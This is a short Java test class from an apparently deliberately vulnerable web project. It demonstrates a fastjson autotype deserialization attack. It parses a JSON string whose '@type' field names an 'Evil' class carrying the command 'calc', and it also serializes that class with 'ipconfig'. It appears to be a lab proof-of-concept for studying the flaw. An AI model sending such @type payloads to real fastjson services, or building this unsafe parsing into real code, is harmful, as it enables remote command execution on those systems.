package cn.bestsec.vulweb.test;

import com.alibaba.fastjson.JSON;
import lombok.Getter;

//import javax.persistence.criteria.CriteriaBuilder;
import java.io.*;

public class FastJsonTests {
    public static void main(String[] args) {
        System.out.println(JSON.toJSON(new Evil("ipconfig")));
        System.out.println(JSON.parse("{\"@type\":\"cn.bestsec.vulweb.test.Evil\", \"payload\":\"calc\"} "));
    }


}

